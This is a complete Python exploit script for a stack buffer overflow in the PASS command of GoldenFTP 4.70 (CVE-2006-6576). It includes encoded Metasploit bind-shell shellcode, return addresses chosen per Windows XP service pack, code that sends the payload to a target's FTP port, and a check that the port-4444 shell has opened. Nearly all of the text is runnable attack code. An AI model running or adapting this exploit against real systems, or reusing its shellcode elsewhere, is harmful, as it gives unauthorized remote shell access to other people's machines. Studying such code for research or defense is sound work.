#!/usr/bin/python

# Exploit Title: GoldenFTP 4.70 PASS exploit
# Date: July 5, 2011
# Author: Joff Thyer (jsthyer@gmail.com)
# Software Link: http://www.goldenftpserver.com/
# Version: 4.70
# Tested on: WinXP-SP0/SP2/SP3
# CVE: 2006-6576
#
# based on exploit written by:
#   Craig Freyman (cd1zz) and Gerardo Iglesias Galvan (iglesiasgg)
#
# Exploit tested on WinXP-SP0/SP2/SP3
#
# Notes:
# - Address 0x004c2030 contains a pointer to where the injected code address
#   must be written.
# - IP address used to connect to FTP server impacts pointer to address.
# - Opcodes starting at 0x004233EF are the exploited assembly sequence.
#   note: address gets moved into EAX, and control obtained through 'CALL EAX'.
#

import socket
import sys
import os
import time

# windows/shell_bind_tcp - 395 bytes
# http://www.metasploit.com
# AutoRunScript=, EXITFUNC=process, InitialAutoRunScript=, 
# LPORT=4444, RHOST=
# Generated with: msfpayload windows/shell_bind_tcp r | msfencode -c 2 -t ruby -b '\x00\x0a\x0d'
scode = "\xdb\xc7\xbb\x63\x6f\x93\x72\xd9\x74\x24\xf4\x5d\x33\xc9" +\
"\xb1\x5d\x31\x5d\x17\x83\xc5\x04\x03\x3e\x7c\x71\x87\x7a" +\
"\x1b\x36\xc1\x6b\xc6\x75\xc8\xff\xd2\x71\xb6\xd6\xd3\xcb" +\
"\x1f\x19\xb1\x38\x23\x9c\x3d\x3c\x76\x88\x9f\x1e\x95\xf4" +\
"\x73\x01\x6b\x64\x44\x28\x9f\x25\x86\x18\x20\xb6\xe8\xa5" +\
"\xf3\xa7\x93\xe1\xcd\x43\x4c\xb6\x38\x76\xd6\x8b\x7f\x16" +\
"\xb3\x91\xf5\x7a\xa9\x60\xdb\x32\xfc\x5a\xc1\xf7\xf3\xdb" +\
"\xb2\xd2\x57\x0c\x3e\x8b\x19\x11\x11\x98\xaa\x18\x4c\xcd" +\
"\x47\xef\x4d\x16\xf6\xb8\xe0\x8f\x44\x36\x6e\xf3\x2e\x97" +\
"\xe5\x3a\xab\xc5\x3c\x02\x82\x20\x6a\xec\x17\xdb\x74\xc6" +\
"\xd0\xca\xbd\x3d\xf1\x61\xa2\xc2\x96\xfc\x30\x7a\x29\xa1" +\
"\x5c\xe6\x23\x1e\x57\x09\x66\x06\x8d\xe9\x52\x6a\xb2\x98" +\
"\x9a\x07\xd7\x96\x77\xd0\x06\x23\x65\x17\xbb\xf6\xba\x6b" +\
"\x44\x8e\xe2\x26\x10\xe7\x71\x4c\x5b\x21\xba\x83\xfc\xce" +\
"\x48\x90\x51\x30\xfa\x87\x84\xde\x21\x8b\xc9\x2f\xa6\xff" +\
"\xe5\xf5\x18\x0c\x59\x98\x82\x8e\xf7\x83\x94\x04\x6f\xfe" +\
"\x2c\xbd\x29\xed\xee\x89\xac\xd5\xb3\x94\xe7\xb7\x10\x82" +\
"\x51\xf5\x95\x13\x84\x44\xc8\x53\x24\x7e\x3a\x22\x60\xe7" +\
"\xe0\xc9\x63\x1b\x59\x53\x78\x67\x37\x80\x06\x97\x8f\xde" +\
"\x19\x30\xa2\xa5\x16\x8e\xe6\x6b\x04\x68\xad\x48\xfd\xd1" +\
"\xd2\x24\x1e\x24\xf8\x14\x23\x14\xd8\xf2\x68\xe3\x85\x51" +\
"\xb8\xdd\x95\x37\xda\x59\xe9\x49\xf5\xa1\x74\x40\xad\xbe" +\
"\x5f\x48\x03\xa5\xa5\x36\x0c\x3e\x32\xa8\x9f\xdf\xf9\x28" +\
"\x45\xc1\x7c\xf3\x03\xcd\x21\x53\x31\x49\xd1\x5d\x2a\x43" +\
"\x04\x41\x19\xef\x74\xdd\x9e\xb7\x4f\x4e\x21\x59\x8a\x77" +\
"\x57\x9b\x61\xd3\xa4\x62\x55\xed\xec\x1e\xc0\xac\x2a\x8f" +\
"\x2b\x7f\x59\xd4\x84\xfa\x8a\x44\xdc\x1c\x01\xdd\xd0\xfc" +\
"\xde\xb2\x03\xe5\x8f\x56\x36\x44\xf9\x91\x40\x32\xb4\xaa" +\
"\x78\xfe\x2f"

if len(sys.argv) < 2:
     print "[-]Usage: %s <target> <platform>" % sys.argv[0]
     print "\tplatform = (sp0|sp1|sp2|sp3)"
     sys.exit(0)

target = sys.argv[1]
platform=""
if len(sys.argv) > 2:
     platform = sys.argv[2]
if platform == "sp0" or platform == "sp1":
     retaddr="\x69\x3c\xa9\x00"
elif platform == "sp2" or platform == "sp3":
     retaddr="\x9d\x3c\xa9\x00"
else:
     platform="sp3"
     retaddr="\x9d\x3c\xa9\x00"

nopsled = "\x90"*32
padding = "\x90" * (541 - len(target + scode + nopsled))
payload = nopsled + scode + padding + retaddr

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print "[+] Golden FTP PASS Exploit, Author: Joff Thyer, 2011"
print "[+] 'Show new connections' must be enabled in GoldenFTP in order"
print "[+] for this exploit to succeed!"
print "[+] Connecting: "+target
try:
    s.connect((target,21))
except:
    print "[-] Connection to "+target+" failed!"
    sys.exit(0)

print "[+] Sending payload..."
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS "+payload+"\r\n")
s.recv(1024)

time.sleep(1)
retval = os.system('netstat -na | find "4444"')
if retval > 0:
    print "[-] Exploit failed"
else:
    print "[+] Exploit succeeded!"
    